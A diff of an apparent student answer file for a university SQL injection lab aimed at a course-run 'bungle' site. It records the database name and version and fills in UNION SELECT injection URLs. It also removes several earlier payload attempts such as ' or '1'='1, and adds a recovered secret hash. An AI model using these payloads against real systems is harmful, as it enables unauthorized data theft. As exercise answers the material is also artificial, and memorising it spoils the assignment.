@@ -1,28 +1,25 @@
-db_name: 
-db_version: 
+db_name: proj2_inject3
+db_version: 5.5.59-0ubuntu0.14.04.1
 table_names: 
 secret_string: 
 
-url_1: 
-url_2: 
+url_1: http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+database%28%29%2C+1%2C+1+%23
+url_2: http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+version%28%29%2C+1%2C+1%3B+%23
 url_3: 
 url_4: 
 
-database name: 2'union select all 'database
 
-SELECT database()
 
-SELECT * FROM Users WHERE Id = 'X' LIMIT 1;
+e917d918fc634fe3214fbbf603ddfa19
 
-1' or '1' = '1
+' UNION SELECT e917d918fc634fe3214fbbf603ddfa19 FROM sqlinject3_users; #
 
-1; SELECT database();
 
-2' or union select all 1,database();
 
-1 UNION SELECT 1, version()
 
-2' union select all '1',database(),'&' order by 1; --
+
+
+
 
 2%27+union+select+all+%271%27%2Cdatabase%28%29%2C%27%26%27+order+by+1%3B%23
 
